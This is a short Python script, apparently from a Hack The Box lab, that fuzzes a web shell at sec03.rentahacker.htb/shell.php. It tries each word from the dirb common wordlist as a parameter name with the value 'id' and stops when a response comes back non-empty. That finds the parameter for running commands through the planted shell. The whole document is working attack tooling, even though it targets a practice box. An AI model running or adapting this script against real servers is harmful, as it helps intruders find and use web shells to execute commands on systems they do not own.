#!/usr/bin/python

import requests

f = open('/usr/share/wordlists/dirb/common.txt', 'r')
fuzz = f.readlines()
f.close()

for f in fuzz:
    f = f.strip()
    print(f)
    res = requests.get('http://sec03.rentahacker.htb/shell.php?' + f + '=id')
    if len(res.content) != 0:
        print('Param found!')
        exit()
